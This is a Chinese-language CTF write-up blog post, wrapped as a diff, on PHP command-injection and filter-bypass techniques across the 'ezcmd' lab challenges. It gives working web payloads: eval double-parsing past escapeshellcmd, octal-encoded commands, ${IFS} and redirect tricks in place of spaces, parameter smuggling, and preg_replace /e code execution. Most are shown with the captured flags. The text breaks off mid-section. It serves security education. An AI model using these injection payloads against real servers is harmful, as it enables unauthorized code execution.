@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>Web命令执行与绕过实战：从ezcmd到无字母数字Shell - Pluto&#039;s Notes</title><link rel="manifest" href="/Myblog/manifest.json"><meta name="theme-color" content="#3273dc"><meta name="application-name" content="极客笔记"><meta name="msapplication-TileImage" content="/img/icon.svg"><meta name="msapplication-TileColor" content="#3273dc"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="极客笔记"><meta name="apple-mobile-web-app-status-bar-style" content="default"><link rel="apple-touch-icon" sizes="192x192" href="/img/icon.svg"><meta name="description" content="一个极客的技术笔记与知识分享站"><meta property="og:type" content="website"><meta property="og:title" content="极客笔记"><meta property="og:url" content="https://pluto839.github.io/Myblog"><meta property="og:site_name" content="Pluto&#039;s Notes"><meta property="og:description" content="一个极客的技术笔记与知识分享站"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pluto839.github.io/img/og_image.png"><meta property="article:published_time" content="2026-09-16T01:00:00.000Z"><meta property="article:modified_time" content="2026-09-15T13:21:26.162Z"><meta property="article:author" content="Pluto"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web安全"><meta property="article:tag" content="命令执行"><meta property="article:tag" content="RCE"><meta property="article:tag" content="绕过"><meta property="article:tag" content="PHP"><meta property="article:tag" content="无字母数字"><meta property="article:tag" content="WebShell"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://pluto839.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://pluto839.github.io/Myblog/2026/09/16/Web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8Eezcmd%E5%88%B0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97Shell/"},"headline":"Web命令执行与绕过实战：从ezcmd到无字母数字Shell","image":[],"datePublished":"2026-09-16T01:00:00.000Z","dateModified":"2026-09-15T13:21:26.162Z","author":{"@type":"Person","name":"Pluto"},"publisher":{"@type":"Organization","name":"Pluto's Notes","logo":{"@type":"ImageObject","url":{"text":"Pluto's Notes"}}},"description":"基于CTF刷题实战，系统梳理PHP命令执行（RCE）从入门到进阶的全部绕过思路：分号拼接、空格绕过、escapeshellcmd转义、黑名单过滤、preg_replace &#x2F;e漏洞、无字母数字WebShell，以及前端逻辑绕过，附完整解题脚本。"}</script><link rel="canonical" href="https://pluto839.github.io/Myblog/2026/09/16/Web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8Eezcmd%E5%88%B0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97Shell/"><link rel="icon" href="/Myblog/img/avatar.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="jsdelivr"><link data-pjax rel="stylesheet" href="/Myblog/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script>
+<meta name="data-root" content="/Myblog/">
+<link rel="stylesheet" href="/Myblog/css/pluto-custom.css">
+<script>
+  var s = localStorage.getItem('pluto-theme');
+  var pd = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  var t = s || (pd ? 'dark' : 'light');
+  document.documentElement.setAttribute('data-theme', t);
+  document.documentElement.setAttribute('data-root', '/Myblog/');
+</script>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.2"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/Myblog/">Pluto&#039;s Notes</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/Myblog/">首页</a><a class="navbar-item" href="/Myblog/archives">归档</a><a class="navbar-item" href="/Myblog/categories">分类</a><a class="navbar-item" href="/Myblog/tags">标签</a><a class="navbar-item" href="/Myblog/links">友链</a><a class="navbar-item" href="/Myblog/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/pluto839"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/Myblog/img/covers/web-security.svg" alt="Web命令执行与绕过实战：从ezcmd到无字母数字Shell"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2026-09-16T01:00:00.000Z" title="2026/9/16 09:00:00">2026-09-16</time>发表</span><span class="level-item"><time dateTime="2026-09-15T13:21:26.162Z" title="2026/9/15 21:21:26">2026-09-15</time>更新</span><span class="level-item"><a class="link-muted" href="/Myblog/categories/CTF/">CTF</a></span><span class="level-item">15 分钟读完 (大约2296个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Web命令执行与绕过实战：从ezcmd到无字母数字Shell</h1><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>命令执行（Command Injection &#x2F; RCE）</strong> 是 Web 安全的高频考点，也是 CTF 里”工厂”味最浓的一类题。它的本质是：<strong>程序把用户输入拼接进了系统命令，而没有做安全处理</strong>，导致攻击者能执行任意命令。</p>
+<p>这篇笔记来自我连刷的一整套命令执行靶场（ezcmd 系列），从最简单的不设防，到 <code>escapeshellcmd()</code> 转义、空格&#x2F;分号过滤、黑名单正则、<code>preg_replace /e</code> 漏洞，一路打到<strong>无字母数字 WebShell</strong>。我把 14 道 ezcmd 和 3 道 basic 的完整思路与解题脚本整理如下。</p>
+<span id="more"></span>
+
+<p>先看各种绕过场景对应的边界条件，方便总览：</p>
+<table>
+<thead>
+<tr>
+<th>关卡</th>
+<th>过滤&#x2F;限制</th>
+<th>核心绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ezcmd 1-3</td>
+<td>基本不设防 &#x2F; 空格过滤</td>
+<td>分号拼接、重定向符 <code>&lt;</code></td>
+</tr>
+<tr>
+<td>ezcmd 4</td>
+<td><code>escapeshellcmd()</code> 转义</td>
+<td><code>eval</code> 二次解析</td>
+</tr>
+<tr>
+<td>ezcmd 5</td>
+<td>禁用字母</td>
+<td>八进制 <code>$&#39;\NNN&#39;</code></td>
+</tr>
+<tr>
+<td>ezcmd 6-7</td>
+<td>不直接回显 &#x2F; 黑名单 <code>flag</code></td>
+<td><code>system()</code> 构造、通配符 <code>*</code></td>
+</tr>
+<tr>
+<td>ezcmd 8-14</td>
+<td>层层加码</td>
+<td>换函数、参数偷渡、套娃、<code>/e</code>、取反</td>
+</tr>
+<tr>
+<td>basic_2&#x2F;3&#x2F;5</td>
+<td>前端逻辑</td>
+<td>改参数、看 JS</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="一、基础命令执行（ezcmd-1-3）"><a href="#一、基础命令执行（ezcmd-1-3）" class="headerlink" title="一、基础命令执行（ezcmd 1-3）"></a>一、基础命令执行（ezcmd 1-3）</h2><h3 id="1-1-ezcmd：最简单的-escapeshellcmd-绕过"><a href="#1-1-ezcmd：最简单的-escapeshellcmd-绕过" class="headerlink" title="1.1 ezcmd：最简单的 escapeshellcmd() 绕过"></a>1.1 ezcmd：最简单的 <code>escapeshellcmd()</code> 绕过</h3><p>这段代码的关键是用了 <code>escapeshellcmd()</code>。</p>
+<p><strong>核心考点：<code>escapeshellcmd()</code> 到底过滤了什么？</strong></p>
+<p>它会转义这些危险字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ; \ | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \x0D`</span><br></pre></td></tr></table></figure>
+
+<p>转义之后，这些符号不能再当命令分隔符，所以 <code>;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>%0a</code> <strong>全都会失效</strong>。</p>
+<p><strong>突破口</strong>：这个函数有一个致命漏洞——它<strong>不过滤空格</strong>，<strong>不过滤反斜杠 <code>/</code></strong>，<strong>也不限制你直接写一整条合法命令</strong>。也就是说：</p>
+<blockquote>
+<p>你不能执行多条命令，但可以直接执行一条完整的系统命令！</p>
+</blockquote>
+<p>用 Burp 改 POST 请求：<code>cmd=ls</code>，得到 <code>index.php</code>。再改请求为 <code>cmd=ls -la</code> 确认目录下只有 <code>index.php</code>，最后 <code>cmd=cat /flag</code> 拿到 flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3b3f2a09-6f0e-4b77-ac02-96b10ef4d1cc&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="1-2-ezcmd-1：无过滤，直接拼接"><a href="#1-2-ezcmd-1：无过滤，直接拼接" class="headerlink" title="1.2 ezcmd_1：无过滤，直接拼接"></a>1.2 ezcmd_1：无过滤，直接拼接</h3><p>代码没有过滤用户输入，直接用 <code>;</code> 拼接即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=127.0.0.1;cat /flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2759f8e0-ea65-46c3-923a-96d5376d16c4&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="1-3-ezcmd-2：一句话后门-分号截断"><a href="#1-3-ezcmd-2：一句话后门-分号截断" class="headerlink" title="1.3 ezcmd_2：一句话后门 + 分号截断"></a>1.3 ezcmd_2：一句话后门 + 分号截断</h3><p>这是一段典型的 PHP 一句话后门代码：接收外部提交的系统命令在服务器执行，隐藏执行结果并显示自身源码。我们只要加一个分号，让传入内容后面的代码失效即可。</p>
+<blockquote>
+<p><code>;</code> 是命令分隔符，<code>#</code> 是单行注释。<code>cmd=xxx;</code> 后面原本拼接的代码就变成注释，不再执行。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;11edca69-c324-49fe-9865-5bdd78a12794&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="1-4-ezcmd-3：禁用空格的-N-种解法"><a href="#1-4-ezcmd-3：禁用空格的-N-种解法" class="headerlink" title="1.4 ezcmd_3：禁用空格的 N 种解法"></a>1.4 ezcmd_3：禁用空格的 N 种解法</h3><p>核心过滤代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$cmd</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no space allowed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解法：使用重定向符 <code>&lt;</code></strong>（专门用来读文件）。Linux 中可以用 <code>&lt;</code> 把文件内容输入给命令，巧妙避开空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常写法：cat /flag</span><br><span class="line">无空格写法：cat&lt;/flag</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、经典绕过（ezcmd-4-7）"><a href="#二、经典绕过（ezcmd-4-7）" class="headerlink" title="二、经典绕过（ezcmd 4-7）"></a>二、经典绕过（ezcmd 4-7）</h2><h3 id="2-1-ezcmd-4：escapeshellcmd-黑名单，靠-eval-二次解析"><a href="#2-1-ezcmd-4：escapeshellcmd-黑名单，靠-eval-二次解析" class="headerlink" title="2.1 ezcmd_4：escapeshellcmd() + 黑名单，靠 eval 二次解析"></a>2.1 ezcmd_4：<code>escapeshellcmd()</code> + 黑名单，靠 <code>eval</code> 二次解析</h3><p>这里用了两层防护：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. escapeshellcmd() 会在 shell 特殊字符前加反斜杠转义</span></span><br><span class="line"><span class="comment">// 2. preg_match() 对转义后的字符串做黑名单校验（忽略大小写 /i）</span></span><br><span class="line"><span class="comment">// 通过校验后执行 system()</span></span><br></pre></td></tr></table></figure>
+
+<p>既然无法读取带 <code>flag</code> 关键字的文件，就打印系统环境变量。<code>env</code> 被过滤，<code>printenv</code> 含 <code>env</code> 也被过滤。但 <code>export</code> 和 <code>set</code> 这两个能打印环境变量的命令<strong>没被 ban</strong>。</p>
+<p>关键 Payload（利用字符拼接 + <code>eval</code> 二次解析）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval a=fl;b=ag;dd if=/$a$b</span><br></pre></td></tr></table></figure>
+
+<p><strong>三层原理：</strong></p>
+<ol>
+<li><strong>过正则</strong>：字符串里没有 <code>flag</code>，也没触发任何被 ban 的读文件命令</li>
+<li><strong>过转义</strong>：<code>escapeshellcmd()</code> 处理后变成 <code>eval a=fl\;b=ag\;dd if=/\$a\$b</code></li>
+<li><strong>二次解析</strong>：bash 把字符串丢给 <code>eval</code> 执行，<code>eval</code> 去掉多余转义符重新解析，实际执行的是 <code>a=fl; b=ag; dd if=/$a$b</code></li>
+</ol>
+<p><code>dd</code> 命令把 <code>/flag</code> 内容输出在网页上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c9ace5cc-d4c5-4dcc-b7c8-5584ca1d70c0&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-2-ezcmd-5：禁用字母-→-八进制编码"><a href="#2-2-ezcmd-5：禁用字母-→-八进制编码" class="headerlink" title="2.2 ezcmd_5：禁用字母 → 八进制编码"></a>2.2 ezcmd_5：禁用字母 → 八进制编码</h3><p>题目不允许使用字母，可以用 <code>$&#39;\NNN&#39;</code> 表示一个字符（<code>NNN</code> 是该字符的<strong>八进制 ASCII 码</strong>）：</p>
+<ul>
+<li><code>c</code> 八进制 <code>143</code>，<code>a</code> 八进制 <code>141</code>，<code>t</code> 八进制 <code>164</code></li>
+<li>所以 <code>$&#39;\143\141\164&#39;</code> 在 Shell 眼里就等于 <code>cat</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=$&#x27;\143\141\164&#x27; $&#x27;\057\146\154\141\147\056\164\170\164&#x27;</span><br><span class="line"># 等价于：cat /flag.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b96ee568-5bc8-48e3-a809-1559eba8308f&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-3-ezcmd-6：无回显-→-用-print-r-system-构造输出"><a href="#2-3-ezcmd-6：无回显-→-用-print-r-system-构造输出" class="headerlink" title="2.3 ezcmd_6：无回显 → 用 print_r&#x2F;system 构造输出"></a>2.3 ezcmd_6：无回显 → 用 <code>print_r</code>&#x2F;<code>system</code> 构造输出</h3><p>发现不回显，那就用 <code>qc=system(&quot;ls /&quot;);</code> 主动输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qc=system(&quot;cat /flag&quot;);   # 等价于之前的 cmd=cat /flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25332d76-a187-4961-802b-7083cdbd30d5&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-4-ezcmd-7：黑名单-flag-→-通配符绕过"><a href="#2-4-ezcmd-7：黑名单-flag-→-通配符绕过" class="headerlink" title="2.4 ezcmd_7：黑名单 flag → 通配符绕过"></a>2.4 ezcmd_7：黑名单 <code>flag</code> → 通配符绕过</h3><p>核心过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);              <span class="comment">// 关闭错误报告，增加盲猜难度</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;qc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$qc</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;qc&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$qc</span>))&#123;   <span class="comment">// 拦截 flag 及所有大小写组合</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$qc</span>);                      <span class="comment">// 通过校验就执行 PHP 代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;flag&#x2F;i 会拦截 <code>flag</code>、<code>FLAG</code>、<code>FlAg</code>、<code>fLaG</code> 等所有大小写。直接用通配符 <code>*</code> 绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qc=system(&quot;cat /fla*&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a8689118-00a3-4520-8d3f-6da4184fb1b0&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、进阶绕过（ezcmd-8-14）"><a href="#三、进阶绕过（ezcmd-8-14）" class="headerlink" title="三、进阶绕过（ezcmd 8-14）"></a>三、进阶绕过（ezcmd 8-14）</h2><h3 id="3-1-ezcmd-8：禁用-system-→-换执行函数"><a href="#3-1-ezcmd-8：禁用-system-→-换执行函数" class="headerlink" title="3.1 ezcmd_8：禁用 system() → 换执行函数"></a>3.1 ezcmd_8：禁用 <code>system()</code> → 换执行函数</h3><p><code>system</code> 被禁用了。但 PHP 还有很多系统命令执行函数：<code>passthru()</code>、<code>exec()</code>、<code>shell_exec()</code>，或者反引号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;163b1b37-765f-49d6-95a9-98b6429a5a88&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-ezcmd-9：过滤空格-system-→-三招绕过"><a href="#3-2-ezcmd-9：过滤空格-system-→-三招绕过" class="headerlink" title="3.2 ezcmd_9：过滤空格 + system → 三招绕过"></a>3.2 ezcmd_9：过滤空格 + system → 三招绕过</h3><p>又过滤了空格（前面 <code>ezcmd_3</code> 那招不够用了，正则还禁了 system）。这里给出<strong>三招通用姿势</strong>：</p>
+<p><strong>招式一：用 PHP 原生函数（最优雅）</strong></p>
+<p>输入是交给 <code>eval()</code> 当作 PHP 代码执行的，谁说一定要调 Linux 系统命令？PHP 自带读文件函数不需要空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload 1: ?qc=show_source(&#x27;flag&#x27;);</span><br><span class="line">Payload 2: ?qc=readfile(&#x27;flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>两个都是 PHP 内置读文件并输出函数，整串既没有 <code>system</code> 也没有空格，完美绕过。</p>
+<p><strong>招式二：参数偷渡大法（最万能）</strong></p>
+<p>正则只检查 <code>$_GET[&#39;qc&#39;]</code>，不检查其他参数。保证 <code>qc</code> 里没有空格和 system 即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?qc=eval($_GET[&#x27;x&#x27;]);&amp;x=passthru(&#x27;cat flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><code>qc</code> 里是 <code>eval($_GET[&#39;x&#39;]);</code>，没空格没 system，过关。接着 <code>eval</code> 抓取参数 <code>x</code> 的值执行，<code>passthru(&#39;cat flag&#39;)</code> 虽然含空格但<strong>没经过正则检查</strong>，成功执行。</p>
+<p><strong>招式三：Linux 空格替代符（进阶）</strong></p>
+<p>Linux 中有很多字符可以代替空格，最常见的是 <code>${IFS}</code>（内部字段分隔符）和 <code>&lt;</code>（输入重定向）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload 1 ($&#123;IFS&#125;): ?qc=passthru(&#x27;cat$&#123;IFS&#125;/flag&#x27;);</span><br><span class="line">Payload 2 (重定向): ?qc=passthru(&#x27;cat&lt;/flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：该题目中前两种不可用，只能走第三种。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1ac93ff2-879b-4edf-998e-194d307a9abb&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-ezcmd-10：过滤分号-→-用-闭合"><a href="#3-3-ezcmd-10：过滤分号-→-用-闭合" class="headerlink" title="3.3 ezcmd_10：过滤分号 → 用 ?&gt; 闭合"></a>3.3 ezcmd_10：过滤分号 → 用 <code>?&gt;</code> 闭合</h3><p>这次把分号过滤了，但可以用 <code>?&gt;</code> 闭合（PHP 的结束标签）。<code>flag.txt</code> 直接用 <code>readfile</code> &#x2F; <code>system</code> 读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e34093a4-7577-4ff3-898a-db05f2a81241&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-ezcmd-11：不知道文件路径-→-直接-highlight"><a href="#3-4-ezcmd-11：不知道文件路径-→-直接-highlight" class="headerlink" title="3.4 ezcmd_11：不知道文件路径 → 直接 highlight"></a>3.4 ezcmd_11：不知道文件路径 → 直接 <code>highlight</code></h3><p>知道是 <code>flag.php</code> 文件但不知道在哪，直接 <code>highlight</code>（高亮输出）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7d041352-1d70-4c5a-b245-67f18d3cb731&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-ezcmd-12：特殊符号不可用-→-函数套娃"><a href="#3-5-ezcmd-12：特殊符号不可用-→-函数套娃" class="headerlink" title="3.5 ezcmd_12：特殊符号不可用 → 函数套娃"></a>3.5 ezcmd_12：特殊符号不可用 → 函数套娃</h3><p>特殊符号都不能用了，用<strong>函数套娃法</strong>构造完整逻辑链：</p>
+<ol>
+<li><code>getcwd()</code> — 获取当前目录路径</li>
+<li><code>scandir(getcwd())</code> — 读取目录文件列表，得到 <code>[&#39;.&#39;, &#39;..&#39;, &#39;flag.php&#39;, &#39;index.php&#39;]</code></li>
+<li>怎么取出 <code>flag.php</code>？严格 PHP 语法下 <code>next()</code>&#x2F;<code>end()</code> 要传变量引用，不能直接嵌套</li>
+<li><strong>终极黑科技</strong>：<code>array_flip()</code> 把数组键值反转，让文件名变键名；再用 <code>array_rand()</code> 随机抽取一个键名</li>
+<li><code>highlight_file()</code>(等价于 <code>show_source()</code>) 高亮输出，忽略参数并无所谓读谁</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;817b9dce-7d4b-495c-ab8d-7ee419e76f8c&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-ezcmd-13：preg-replace-e-漏洞"><a href="#3-6-ezcmd-13：preg-replace-e-漏洞" class="headerlink" title="3.6 ezcmd_13：preg_replace /e 漏洞"></a>3.6 ezcmd_13：<code>preg_replace /e</code> 漏洞</h3><p>这是一道非常经典的 <strong><code>preg_replace</code> 函数的 <code>/e</code> 修饰符代码执行漏洞</strong>（PHP 5.5.0 以下版本）。</p>
+<p><strong>代码分析：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$re</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;re&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$re</span> === <span class="string">&#x27;&#x27;</span> || <span class="variable">$str</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
+
+<p>关键点：<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;, ...)</code>——第一个参数里有 <strong><code>/e</code> 修饰符</strong>。<code>i</code> 忽略大小写，<code>e</code> 就是传说中万恶之源的 <strong>eval（执行）</strong> 修饰符。</p>
+<p>当 PHP 发现 <code>/e</code> 时，它<strong>不会把第二个参数 <code>strtolower(&quot;\\1&quot;)</code> 当成普通文本替换，而是当成 PHP 代码去执行</strong>！</p>
+<p><strong>Payload 如何生效：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?re=.*&amp;str=&#123;$&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代入后第一个参数变成 <code>/(.*)/ei</code>，<code>.*</code> 匹配一切。正则成功匹配整个 <code>{${system(&#39;ls&#39;)}}</code>，于是第二个参数变成 <code>strtolower(&quot;{${system(&#39;ls&#39;)}}&quot;)</code>，被当成代码执行。</p>
+<p>在 PHP 双引号字符串中，遇到 <strong><code>${}</code> &#x2F; <code>{${}}</code></strong> 这种复杂变量解析语法，引擎会<strong>先执行大括号里的函数</strong>，获取返回值。于是 <code>system(&#39;ls&#39;)</code> 就这样被无情执行了。</p>
+<p>构造真正的读取命令：</p>
